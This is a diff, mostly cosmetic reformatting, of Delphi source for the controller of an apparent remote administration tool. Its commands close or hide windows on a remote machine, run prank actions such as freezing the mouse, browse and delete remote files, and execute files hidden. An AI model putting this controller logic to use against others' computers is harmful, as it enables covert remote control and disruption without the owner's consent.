+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              if mslistviewitem.Caption = 'Program Manager' then
+                begin
+                  if MessageDlg(_('¿Está seguro que desea intentar cerrar la ventana Program Manager? (Es posible que coolserver se bloquee)?'), mtConfirmation, [mbYes, mbNo], 0) = idyes then
+                    Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
+                end
+              else
+                Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
   BtnRefrescarVentanas.Click;
 end;
 
 //Item del popupmenu para maximizar una ventana
+
 procedure TFormControl.Maximizar1Click(Sender: TObject);
 begin
   mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('MAXWIN|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
- BtnRefrescarVentanas.Click;
+  BtnRefrescarVentanas.Click;
 end;
 
 //Item del popupmenu para minimizar una ventana
+
 procedure TFormControl.Minimizar1Click(Sender: TObject);
 begin
-mslistviewitem := ListViewVentanas.Selected;
+  mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('MINWIN|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
   BtnRefrescarVentanas.Click;
 end;
 
 //Item del popupmenu para mostrar una ventana
+
 procedure TFormControl.Mostrar1Click(Sender: TObject);
 begin
-mslistviewitem := ListViewVentanas.Selected;
+  mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('SHOWWIN|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
   BtnRefrescarVentanas.Click;
 end;
 
 //Item del popupmenu para ocultar una ventana
+
 procedure TFormControl.Ocultar1Click(Sender: TObject);
 begin
-mslistviewitem := ListViewVentanas.Selected;
+  mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('HIDEWIN|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
   BtnRefrescarVentanas.Click;
 end;
 
 //Item del popupmenu para minimizar todas las ventanas
+
 procedure TFormControl.Minimizartodas1Click(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
@@ -1650,91 +1679,93 @@ begin
 end;
 
 //Activar Botón cerrar [X] de una ventana
+
 procedure TFormControl.Activar1Click(Sender: TObject);
 begin
-mslistviewitem := ListViewVentanas.Selected;
+  mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('BOTONCERRAR|SI|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Desactivar Botón cerrar [X] de una ventana
+
 procedure TFormControl.Desactivar1Click(Sender: TObject);
 begin
-mslistviewitem := ListViewVentanas.Selected;
+  mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
+      else
+        begin
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('BOTONCERRAR|NO|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
-
 
 procedure TFormControl.BtnEnviarBromasClick(Sender: TObject);
 var
   broma: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if ListViewBromas.Selected = nil then
-      MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
-    else
     begin
-      case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
-        0: Broma := 'MOUSETEMBLOROSO';
-        1: Broma := 'CONGELARMOUSE';
-        2: Broma := 'ABRIRCD';
-        3: Broma := 'MATARBOTONINICIO';
-      end;
-      if ListViewBromas.Selected.SubItems[0] = _('Desactivado') then
-      begin
-        Servidor.Connection.Writeln(Broma + '|ACTIVAR');
-        if Broma = 'MOUSETEMBLOROSO' then
-          ListViewBromas.Items[1].SubItems[0] := _('Desactivado');
-        // El mouse se descongela si se activa el congela mouse
-        if Broma = 'CONGELARMOUSE' then
-          ListViewBromas.Items[0].SubItems[0] := _('Desactivado');
-        //El mouse para de temblar si se congela
-      end
-      else  //Si esta activada
-        Servidor.Connection.Writeln(Broma + '|DESACTIVAR');
-    end;
-  end
+      if ListViewBromas.Selected = nil then
+        MessageDlg(_('Selecciona alguna broma'), mtWarning, [mbOK], 0)
+      else
+        begin
+          case ListViewBromas.Selected.Index of //Selecciona la broma que se va a enviar
+            0: Broma := 'MOUSETEMBLOROSO';
+            1: Broma := 'CONGELARMOUSE';
+            2: Broma := 'ABRIRCD';
+            3: Broma := 'MATARBOTONINICIO';
+          end;
+          if ListViewBromas.Selected.SubItems[0] = _('Desactivado') then
+            begin
+              Servidor.Connection.Writeln(Broma + '|ACTIVAR');
+              if Broma = 'MOUSETEMBLOROSO' then
+                ListViewBromas.Items[1].SubItems[0] := _('Desactivado');
+              // El mouse se descongela si se activa el congela mouse
+              if Broma = 'CONGELARMOUSE' then
+                ListViewBromas.Items[0].SubItems[0] := _('Desactivado');
+              //El mouse para de temblar si se congela
+            end
+          else //Si esta activada
+            Servidor.Connection.Writeln(Broma + '|DESACTIVAR');
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Funciones del FileManager
+
 procedure TFormControl.BtnVerUnidadesClick(Sender: TObject);
 begin
-  BtnVerUnidades.Enabled := false;
-  BtnActualizarArchivos.Enabled := false;
-  EditPathArchivos.Enabled := false;
-  cmbUnidades.Enabled := false;
+  BtnVerUnidades.Enabled := False;
+  BtnActualizarArchivos.Enabled := False;
+  EditPathArchivos.Enabled := False;
+  cmbUnidades.Enabled := False;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('VERUNIDADES')
   else
@@ -1744,12 +1775,12 @@ end;
 procedure TFormControl.cmbUnidadesSelect(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
-  begin
-    Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
-    //Manda 'LISTARARCHIVOS|C:\'
-    if cmbUnidades.Text <> '' then
-    EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
-  end
+    begin
+      Servidor.Connection.Writeln('LISTARARCHIVOS|' + Copy(cmbUnidades.Text, 1, 3));
+      //Manda 'LISTARARCHIVOS|C:\'
+      if cmbUnidades.Text <> '' then
+        EditPathArchivos.Text := Copy(cmbUnidades.Text, 1, 3);
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -1758,206 +1789,207 @@ procedure TFormControl.ListViewArchivosDblClick(Sender: TObject);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if ListViewArchivos.Selected = nil then
     MessageDlg(_('Dale doble click a una carpeta o a un archivo!'), mtWarning, [mbOK], 0)
   else
-  begin
-    if ListViewArchivos.Selected.Caption = '<..>' then
     begin
-      Estado(_('Listando archivos...'));
-      EditPathArchivos.Text :=
-        Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
-      EditPathArchivos.Text :=
-        Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
-      BtnActualizarArchivos.click;
-    end
-    else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clickiò una carpeta
-    begin
-      Estado(_('Listando archivos...'));
-      ListViewArchivos.Selected.ImageIndex := 4;  //Icono de carpeta abierta
-      EditPathArchivos.Text :=
-        EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
-      BtnActualizarArchivos.Click;
-    end
-    else  //doble-clickiò un archivo
-    begin
-      //Tal vez escribir código para ejecutar...
+      if ListViewArchivos.Selected.Caption = '<..>' then
+        begin
+          Estado(_('Listando archivos...'));
+          EditPathArchivos.Text :=
+            Copy(EditPathArchivos.Text, 1, Length(EditPathArchivos.Text) - 1); //Borra el ultimo '\'
+          EditPathArchivos.Text :=
+            Copy(EditPathArchivos.Text, 1, LastDelimiter('\', EditPathArchivos.Text));
+          BtnActualizarArchivos.Click;
+        end
+      else if ListViewArchivos.Selected.ImageIndex = 3 then //doble-clickiò una carpeta
+        begin
+          Estado(_('Listando archivos...'));
+          ListViewArchivos.Selected.ImageIndex := 4; //Icono de carpeta abierta
+          EditPathArchivos.Text :=
+            EditPathArchivos.Text + ListViewArchivos.Selected.Caption + '\';
+          BtnActualizarArchivos.Click;
+        end
+      else //doble-clickiò un archivo
+        begin
+          //Tal vez escribir código para ejecutar...
+        end;
     end;
-  end;
 end;
 
 //Función que se ejecuta justo antes de mostrarse el popupmenu para habilitar o deshabilitar submenus
+
 procedure TFormControl.ListViewArchivosContextPopup(Sender: TObject;
-  MousePos: TPoint; var Handled: boolean);
+  MousePos: TPoint; var Handled: Boolean);
 var
   ext: string;
-  i: integer;
+  i: Integer;
 begin
-  for i:= 0 to PopupFileManager.items.count-1 do
-    PopupFileManager.items[i].visible := true;//todos visibles
-  Abrirdirectorio1.visible := false; //Abrir directorio del archivo
+  for i := 0 to PopupFileManager.Items.Count - 1 do
+    PopupFileManager.Items[i].Visible := True; //todos visibles
+  Abrirdirectorio1.Visible := False; //Abrir directorio del archivo
 
   if ListViewArchivos.Selected <> nil then //Algún item seleccionado
-  begin
-    for i:= 0 to PopupFileManager.items.count-1 do //primero habilitamos todos
-      PopupFileManager.items[i].enabled := true;
-    if (ListViewArchivos.Selected.ImageIndex = 3) then  //Es una carpeta
     begin
-      Descargarfichero1.Enabled := True;  //Descargar!
-      Agregaracoladedescarga1.Enabled := False;  //No Encolar Descarga
-      EjecutarAbrir1.Enabled := False;  //No ejecutar
-      Previsualizarjpg1.Enabled := False;  //No Previsualizar jpg
+      for i := 0 to PopupFileManager.Items.Count - 1 do //primero habilitamos todos
+        PopupFileManager.Items[i].Enabled := True;
+      if (ListViewArchivos.Selected.ImageIndex = 3) then //Es una carpeta
+        begin
+          Descargarfichero1.Enabled := True; //Descargar!
+          Agregaracoladedescarga1.Enabled := False; //No Encolar Descarga
+          EjecutarAbrir1.Enabled := False; //No ejecutar
+          Previsualizarjpg1.Enabled := False; //No Previsualizar jpg
+        end
+      else //Viceversa
+        begin
+          Descargarfichero1.Enabled := True;
+          Agregaracoladedescarga1.Enabled := True;
+          EjecutarAbrir1.Enabled := True;
+          Previsualizarjpg1.Enabled := True;
+        end;
+      Eliminar.Enabled := True; //Eliminar
+      Cambiarnombre1.Enabled := True; //Cambiar nombre
+      Crearnuevacarpeta1.Enabled := True; //Nueva carpeta
+      ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
+      if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') or (lowercase(ext) = '.bmp') then
+        begin
+          Previsualizarjpg1.Enabled := True; //Previsualizar jpg avanzado
+        end;
+
+      if listviewarchivos.Selected.subitems.Count > 0 then //no disponible
+        begin
+          CambiarAtributos1.Enabled := True; //Atributos
+          if ((Pos('Oculto', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
+            Oculto2.Checked := True
+          else
+            Oculto2.Checked := False;
+
+          if ((Pos('Sistema', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
+            Sistema1.Checked := True
+          else
+            Sistema1.Checked := False;
+
+          if ((Pos('Lectura', listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
+            Slolectura1.Checked := True
+          else
+            Slolectura1.Checked := False;
+        end;
+
     end
-    else  //Viceversa
+  else //Si no se ha seleccionado ningún item
     begin
-      Descargarfichero1.Enabled := True;
-      Agregaracoladedescarga1.Enabled := True;
-      EjecutarAbrir1.Enabled := True;
-      Previsualizarjpg1.Enabled := True;
+      Descargarfichero1.Enabled := False; //Deshabilitar Descargar
+      Agregaracoladedescarga1.Enabled := False; //Deshabilitar Encolar Descarga
+      PopupFileManager.Items[3].Enabled := False; //Deshabilitar Ejecutar
+      EjecutarAbrir1.Enabled := False; //Deshabilitar Eliminar
+      Eliminar.Enabled := False; //Deshabilitar Cambiar nombre
+      CambiarAtributos1.Enabled := False; //Deshabilitar Cambiar atributos
+      Previsualizarjpg1.Enabled := False; //Previsualizar jpg avanzado
+      Portapapeles1.Enabled := False; //Portapapeles
+      Cambiarnombre1.Enabled := False; //Deshabilitar
+      if EditPathArchivos.Text = '' then
+        //Si no está en ningún Path deshabilitar crear carpeta
+        Crearnuevacarpeta1.Enabled := False;
     end;
-    Eliminar.Enabled := True;  //Eliminar
-    Cambiarnombre1.Enabled := True;  //Cambiar nombre
-    Crearnuevacarpeta1.Enabled := True;  //Nueva carpeta
-    ext := ExtractFileExt(ListViewArchivos.Selected.Caption);
-    if (lowercase(ext) = '.jpg') or (lowercase(ext) = '.jpeg') or (lowercase(ext) = '.bmp') then
-    begin
-      Previsualizarjpg1.Enabled := True; //Previsualizar jpg avanzado
-    end;
-
-    if listviewarchivos.Selected.subitems.Count >0 then //no disponible
-    begin
-      CambiarAtributos1.Enabled := True; //Atributos
-      if((pos('Oculto',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
-        Oculto2.Checked := true
-      else
-        Oculto2.Checked := false;
-
-      if((pos('Sistema',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
-        Sistema1.Checked := true
-      else
-        Sistema1.Checked := false;
-
-      if((pos('Lectura',listviewarchivos.Selected.subitems.Strings[2]) > 0)) then
-        Slolectura1.Checked := true
-      else
-        Slolectura1.Checked := false;
-    end;
-    
-  end
-  else  //Si no se ha seleccionado ningún item
-  begin
-    Descargarfichero1.Enabled := False; //Deshabilitar Descargar
-    Agregaracoladedescarga1.Enabled := False; //Deshabilitar Encolar Descarga
-    PopupFileManager.Items[3].Enabled := False; //Deshabilitar Ejecutar
-    EjecutarAbrir1.Enabled := False; //Deshabilitar Eliminar
-    Eliminar.Enabled := False; //Deshabilitar Cambiar nombre
-    CambiarAtributos1.Enabled := False; //Deshabilitar Cambiar atributos
-    Previsualizarjpg1.Enabled := False; //Previsualizar jpg avanzado
-    Portapapeles1.Enabled := False; //Portapapeles
-    Cambiarnombre1.Enabled := False; //Deshabilitar
-    if EditPathArchivos.Text = '' then
-      //Si no está en ningún Path deshabilitar crear carpeta
-      Crearnuevacarpeta1.Enabled := False;
-  end;
 
 end;
 
 procedure TFormControl.Normal1Click(Sender: TObject);
 var
-  FilePath : string;
+  FilePath: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      mslistviewitem := ListViewArchivos.Selected
-    else
-      mslistviewitem := ListViewBuscar.Selected;
-      
-    while Assigned(mslistviewitem) do
     begin
-    
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        FilePath := EditPathArchivos.Text +mslistviewitem.Caption
+        mslistviewitem := ListViewArchivos.Selected
       else
-        FilePath := mslistviewitem.subitems[0];
+        mslistviewitem := ListViewBuscar.Selected;
 
-      Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
-      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
-      else
-        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
-    end;
-  end
+      while Assigned(mslistviewitem) do
+        begin
+
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
+          else
+            FilePath := mslistviewitem.subitems[0];
+
+          Servidor.Connection.Writeln('EXEC|NORMAL|' + FilePath);
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
+          else
+            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.Oculto1Click(Sender: TObject);
 var
-  FilePath : string;
+  FilePath: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      mslistviewitem := ListViewArchivos.Selected
-    else
-      mslistviewitem := ListViewBuscar.Selected;
-
-    while Assigned(mslistviewitem) do
     begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        FilePath := EditPathArchivos.Text + mslistviewitem.Caption
+        mslistviewitem := ListViewArchivos.Selected
       else
-        FilePath := mslistviewitem.subitems[0];
-      Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);
+        mslistviewitem := ListViewBuscar.Selected;
 
-      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
-      else
-        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+      while Assigned(mslistviewitem) do
+        begin
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
+          else
+            FilePath := mslistviewitem.subitems[0];
+          Servidor.Connection.Writeln('EXEC|OCULTO|' + FilePath);
 
-    end;
-  end
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
+          else
+            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+
+        end;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.EliminarClick(Sender: TObject);
 var
-  FilePath : string;
+  FilePath: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      mslistviewitem := ListViewArchivos.Selected
-    else
-      mslistviewitem := ListViewBuscar.Selected;
-    if MessageDlg(_('¿Está seguro que quiere borrar los archivos/carpetas seleccionados?'), mtConfirmation, [mbYes, mbNo], 0) = idno then
-      exit;
-
-    while Assigned(mslistviewitem) do
     begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        FilePath := EditPathArchivos.Text + mslistviewitem.Caption
+        mslistviewitem := ListViewArchivos.Selected
       else
-        FilePath := mslistviewitem.subitems[0];
-      if mslistviewitem.ImageIndex = 3 then
-        Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
-      else
-        Servidor.Connection.Writeln('DELFILE|' + FilePath);
+        mslistviewitem := ListViewBuscar.Selected;
+      if MessageDlg(_('¿Está seguro que quiere borrar los archivos/carpetas seleccionados?'), mtConfirmation, [mbYes, mbNo], 0) = idno then
+        Exit;
+
+      while Assigned(mslistviewitem) do
+        begin
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            FilePath := EditPathArchivos.Text + mslistviewitem.Caption
+          else
+            FilePath := mslistviewitem.subitems[0];
+          if mslistviewitem.ImageIndex = 3 then
+            Servidor.Connection.Writeln('DELFOLDER|' + FilePath)
+          else
+            Servidor.Connection.Writeln('DELFILE|' + FilePath);
+          if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+            mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
+          else
+            mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+        end;
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
-      else
-        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      btnactualizararchivos.Click;
-  end
+        btnactualizararchivos.Click;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -1968,55 +2000,56 @@ begin
   ListViewArchivos.Selected.EditCaption;
 end;
 
-
-procedure TFormControl.ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;  Item: TListItem; SubItem: integer; State: TCustomDrawState; var DefaultDraw: boolean);
+procedure TFormControl.ListViewDescargasCustomDrawSubItem(Sender: TCustomListView;
+  Item: TListItem; SubItem: Integer; State: TCustomDrawState; var DefaultDraw: Boolean);
 var
   Descarga: TDescargaHandler;
 begin
   //exit;
   if (item.data <> nil) then
-  begin
-  Descarga := TDescargaHandler(Item.Data);
-  if Descarga.Finalizado then
-  begin
-    Sender.Canvas.Font.Color := clGreen;
-    Sender.Canvas.Font.Style := [fsbold];
-  end
-  else if not Descarga.cancelado then
-  begin
-    Sender.Canvas.Font.Color := clBlack;
-    Sender.Canvas.Font.Style := [];
-  end
-  else
-  begin
-    Sender.Canvas.Font.Color := clRed;
-    Sender.Canvas.Font.Style := [fsbold];
-  end;
-  end;
-end;
+    begin
+      Descarga := TDescargaHandler(Item.Data);
+      if Descarga.Finalizado then
+        begin
+          Sender.Canvas.Font.Color := clGreen;
+          Sender.Canvas.Font.Style := [fsbold];
+        end
+      else if not Descarga.cancelado then
+        begin
+          Sender.Canvas.Font.Color := clBlack;
+          Sender.Canvas.Font.Style := [];
+        end
+      else
+        begin
+          Sender.Canvas.Font.Color := clRed;
+          Sender.Canvas.Font.Style := [fsbold];
+        end;
+    end;
+end;
+
 procedure TFormControl.ListViewArchivosEdited(Sender: TObject;
   Item: TListItem; var S: string);
 begin
   if Servidor.Connection.Connected then
-  begin
-    if S = '' then
     begin
-      S := Item.Caption;
-      Exit;
-    end;
-    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or
-      (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or
-      (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
-    begin
-      MessageDlg(
-        _('Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres:')+' */\?"<>|',
-        mtError, [mbOK], 0);
-      S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
+      if S = '' then
+        begin
+          S := Item.Caption;
+          Exit;
+        end;
+      if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('\', S) <> 0) or
+        (Pos('/', S) <> 0) or (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or
+        (Pos('"', S) <> 0) or (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
+        begin
+          MessageDlg(
+            _('Nombre de carpeta inválido. Una carpeta no puede tener ninguno de los siguientes carácteres:') + ' */\?"<>|',
+            mtError, [mbOK], 0);
+          S := Item.Caption; //Así evitamos que se cambie el nombre en el ListView
+        end
+      else
+        Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
+          ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
     end
-    else
-      Servidor.Connection.Writeln('RENAME|' + EditPathArchivos.Text +
-        ListViewArchivos.Selected.Caption + '|' + EditPathArchivos.Text + S);
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
@@ -2026,51 +2059,52 @@ var
   DirName: string;
 begin
   if Servidor.Connection.Connected then
-  begin
-    DirName := InputBox(_('Escriba el nombre para la nueva carpeta.'),
-      _('Crear nueva carpeta'), _('Nueva carpeta'));
-    if DirName <> '' then
     begin
-      if DirName[Length(DirName)] <> '\' then
-        DirName := DirName + '\';
-      Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
-    end;
-    btnactualizararchivos.Click;
-  end
+      DirName := InputBox(_('Escriba el nombre para la nueva carpeta.'),
+        _('Crear nueva carpeta'), _('Nueva carpeta'));
+      if DirName <> '' then
+        begin
+          if DirName[Length(DirName)] <> '\' then
+            DirName := DirName + '\';
+          Servidor.Connection.Writeln('MKDIR|' + EditPathArchivos.Text + DirName);
+        end;
+      btnactualizararchivos.Click;
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 procedure TFormControl.BtnActualizarArchivosClick(Sender: TObject);
 begin
-  ParaDeListar := false;
-  if not BtnActualizarArchivos.Enabled then exit;
+  ParaDeListar := False;
+  if not BtnActualizarArchivos.Enabled then Exit;
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    Exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if Length(EditPathArchivos.Text) < 3 then
-  begin
-    MessageDlg(_('No escribiste un directorio válido.'), mtWarning, [mbOK], 0);
-    exit;
-  end;
-  BtnActualizarArchivos.Enabled := false;
-  ListviewArchivos.enabled := false;
-  CmbUnidades.enabled := false;
-  SpeedbuttonRutasRapidas.enabled := false;
+    begin
+      MessageDlg(_('No escribiste un directorio válido.'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
+  BtnActualizarArchivos.Enabled := False;
+  ListviewArchivos.Enabled := False;
+  CmbUnidades.Enabled := False;
+  SpeedbuttonRutasRapidas.Enabled := False;
